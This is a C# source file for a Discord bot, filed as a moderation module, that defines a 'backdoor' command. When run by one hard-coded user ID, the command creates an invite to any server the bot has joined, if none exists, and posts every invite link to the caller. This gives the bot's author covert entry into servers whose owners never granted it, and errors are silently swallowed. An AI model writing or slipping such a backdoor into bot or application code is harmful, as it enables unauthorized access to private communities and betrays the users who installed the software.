using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace SpongeBot.Source.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor")]
        public async Task BackdoorCmd(ulong GuildID)
        {
            if(!(Context.User.Id == 483804071111819266))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator");
                return;
            }

            if(Context.Client.Guilds.Where(x => x.Id == GuildID).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id= " + GuildID);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildID).FirstOrDefault();
            try
            {
                var Invite = await Guild.GetInvitesAsync();
                if (Invite.Count() < 1)
                {
                    try
                    {
                        await Guild.TextChannels.First().CreateInviteAsync();
                    }
                    catch (Exception e)
                    {
                        await Context.Channel.SendMessageAsync("something went wrong");
                        return;
                    }
                }
                Invite = null;
                Invite = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for guild {Guild.Name}: ", Guild.IconUrl);
                Embed.WithColor(40, 200, 150);
                foreach (var Current in Invite)
                    Embed.AddInlineField("Invite: ", $"[Invite]({Current.Url})");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            } catch(Exception e)
            {

            }
            //Context.Client.Guilds.Where(x => x.Id == GuildID).FirstOrDefault();

        }

    }
}
